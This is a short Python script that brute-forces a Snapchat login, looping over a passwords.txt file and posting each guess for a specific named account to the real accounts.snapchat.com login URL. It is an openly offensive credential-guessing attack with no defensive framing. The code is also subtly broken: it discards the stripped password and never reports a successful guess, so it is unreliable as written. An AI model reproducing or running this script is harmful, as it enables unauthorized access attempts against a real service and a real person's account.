import requests


def bruteforce(username, url):
    for password in passwords:
        password.strip()
        print('[!! trying to bruteforce password ' + password)
        data_dictionary = {'username': username,
                           'password': password, 'log in': 'submit'}
        resp = requests.post(url, data_dictionary)

        if "That's not the right password." in str(resp.content):
            pass

url = 'https://accounts.snapchat.com/accounts/login?client_id=geo'
username = 'ko50am'


with open('passwords.txt', 'r') as passwords:
    bruteforce(username, url)
